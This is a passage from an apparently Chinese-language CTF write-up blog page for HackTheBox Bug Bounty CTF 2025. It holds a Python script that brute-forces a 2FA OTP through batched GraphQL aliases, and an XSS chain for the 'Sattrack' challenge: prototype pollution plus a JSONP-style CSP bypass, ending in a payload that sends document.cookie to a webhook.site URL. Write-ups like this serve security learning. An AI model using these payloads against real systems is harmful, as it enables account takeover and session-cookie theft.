class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://94.237.58.201:32592&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://94.237.58.201:32592/profile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_query</span>(<span class="params">batch_start: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根據 batch_start (0、100、200…) 生成包含 100 條 alias 的 GraphQL mutation 字串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    lines = [<span class="string">&#x27;mutation &#123;&#x27;</span>]</span><br><span class="line">    token = <span class="string">&quot;9e3c3c48-33b5-41a4-8b22-1bdc9a4e2be5&quot;</span>  <span class="comment"># GraphQL body 裡也要帶上同樣的 token</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(batch_start, batch_start + <span class="number">100</span>):</span><br><span class="line">        otp = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span></span><br><span class="line">        alias = <span class="string">f&quot;a<span class="subst">&#123;otp&#125;</span>&quot;</span></span><br><span class="line">        lines.append(<span class="string">f&#x27;  <span class="subst">&#123;alias&#125;</span>: verifyTwoFactor(token: &quot;<span class="subst">&#123;token&#125;</span>&quot;, otp: &quot;<span class="subst">&#123;otp&#125;</span>&quot;) &#123;&#123;&#x27;</span>)</span><br><span class="line">        lines.append(<span class="string">&#x27;    token&#x27;</span>)</span><br><span class="line">        lines.append(<span class="string">&#x27;    user &#123; id email username &#125;&#x27;</span>)</span><br><span class="line">        lines.append(<span class="string">&#x27;  &#125;&#x27;</span>)</span><br><span class="line">    lines.append(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_batch</span>(<span class="params">start: <span class="built_in">int</span></span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;query&quot;</span>: build_query(start)&#125;</span><br><span class="line">    resp = requests.post(GRAPHQL_URL, json=payload, headers=HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.status_code)</span><br><span class="line">        data = resp.json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 非 JSON 回應，HTTP <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果某個 alias 成功返回 token，就表示找到了正確 OTP</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;data&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> alias, result <span class="keyword">in</span> data[<span class="string">&quot;data&quot;</span>].items():</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">and</span> result.get(<span class="string">&quot;token&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到正確 OTP: <span class="subst">&#123;alias[<span class="number">1</span>:]&#125;</span>，新 token = <span class="subst">&#123;result[<span class="string">&#x27;token&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 全部失敗</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 從 0000 到 9999，以 100 為一組開始爆破…&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 嘗試範圍 <span class="subst">&#123;start:04d&#125;</span> ~ <span class="subst">&#123;start+<span class="number">99</span>:04d&#125;</span>&quot;</span>)</span><br><span class="line">        success = try_batch(start)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 所有範圍均嘗試完畢，未找到正確 OTP。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()                   </span><br></pre></td></tr></table></figure>
+
+<h3 id="Sattrack"><a href="#Sattrack" class="headerlink" title="Sattrack"></a>Sattrack</h3><p>XSS 題，CSP 全限制 self<br>重點：<code>/login</code> 路徑有段 js  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mergeObjects</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> depth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (depth &gt; <span class="number">10</span>) <span class="keyword">return</span> target;</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; source[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                target[key] = <span class="title function_">merge</span>(target[key] || &#123;&#125;, source[key]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                target[key] = source[key];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(target, source);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">startApplication</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    <span class="keyword">const</span> userMessage = params.<span class="title function_">get</span>(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> isValidated = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> defaultConfig = &#123; <span class="attr">text</span>: <span class="string">&quot;&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> userConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="built_in">decodeURIComponent</span>(userMessage));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> config = <span class="title function_">mergeObjects</span>(defaultConfig, userConfig);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">validateMessage</span>(config)) &#123;</span><br><span class="line">            isValidated = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            isValidated = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error processing message:&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">loadScripts</span>();</span><br><span class="line">    <span class="keyword">if</span> (isValidated) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Validated&quot;</span>);</span><br><span class="line">        <span class="title function_">showError</span>(defaultConfig.<span class="property">text</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isLoaded &amp;&amp; userMessage !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Not validated&quot;</span>);</span><br><span class="line">        <span class="title function_">showError</span>(<span class="string">&quot;Invalid message!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>mergeObject 有 prototype pollution，而 startApplication 本來是用來提供登入錯誤訊息剛好就可以拿來觸發。<br>PoC:  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;abc&quot;</span>:<span class="string">&quot;whale&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJ3LsC0Egl.png" alt="image">  </p>
+<p>再來看這段  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadScripts</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Loading scripts&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> settings = <span class="variable language_">window</span>.<span class="property">settings</span>.<span class="property">JS_FILES</span> ? <span class="variable language_">window</span>.<span class="property">settings</span> : <span class="keyword">await</span> <span class="title function_">retrieveSettings</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (settings.<span class="property">JS_FILES</span>) &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(settings.<span class="property">JS_FILES</span>).<span class="title function_">map</span>(<span class="function"><span class="params">src</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">                    script.<span class="property">src</span> = src;</span><br><span class="line">                    script.<span class="property">onload</span> = resolve;</span><br><span class="line">                    script.<span class="property">onerror</span> = reject;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to load scripts:&quot;</span>, error);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Scripts loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>拿到 prototype pollution 後蓋掉 JS_FILES 屬性就可以任意引入 js file，剩下 csp 要繞過。<br>剛好就有這麼一段類似 jsonp 的 endpoint 用來分享資料  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://94.237.57.115:53170/partner/share?type=atmosphere&amp;data=&#123;1.1, 2.2, 3.3&#125;</span><br></pre></td></tr></table></figure>
+
+<p>試一下可以這樣構造  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://94.237.57.115:53170/partner/share?type=whale&quot;&#125;;location.href=&#x27;https://webhook.site/201d87bc-bb9c-4311-89eb-f693571789ea&#x27;%2Bbtoa(document.cookie);//&amp;data=whale</span><br></pre></td></tr></table></figure>
+<p>組合出來變成  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;whale&quot;</span>&#125;;location.<span class="property">href</span>=<span class="string">&#x27;https://webhook.site/201d87bc-bb9c-4311-89eb-f693571789ea&#x27;</span>+<span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//&quot;: &quot;whale&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>挺合法的<br>Final Payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/login?message=%7B%22__proto__%22%3A%7B%22JS_FILES%22%3A%7B%22evil%22%3A%22http%253A%252F%252F127.0.0.1%252Fpartner%252Fshare%253Ftype%253Dwhale%252522%257D%253Bfetch(%252527https%253A%252F%252Fwebhook.site%252F201d87bc-bb9c-4311-89eb-f693571789ea%252F%252527%25252Bbtoa%2528document.cookie%2529)%253B%252F%252F%2526data%253Dwhale%22%7D%7D%7D</span><br></pre></td></tr></table></figure>
+<p>幫大家 decode 一下 XD  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;JS_FILES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;evil&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://94.237.57.115:53170/partner/share?type=whale%22&#125;;fetch(%27https://webhook.site/201d87bc-bb9c-4311-89eb-f693571789ea/%27%2Bbtoa(document.cookie));//&amp;data=whale&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">2.</span> <span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JinjaCare"><span class="toc-number">2.1.</span> <span class="toc-text">JinjaCare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NeoVault"><span class="toc-number">2.2.</span> <span class="toc-text">NeoVault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CitiSmart"><span class="toc-number">2.3.</span> <span class="toc-text">CitiSmart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpeedNet"><span class="toc-number">2.4.</span> <span class="toc-text">SpeedNet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sattrack"><span class="toc-number">2.5.</span> <span class="toc-text">Sattrack</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/06/30/2025-bugbountyctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&text=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&is_video=false&description=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Bug Bounty CTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/06/30/2025-bugbountyctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&name=HackTheBox Bug Bounty CTF 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&t=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
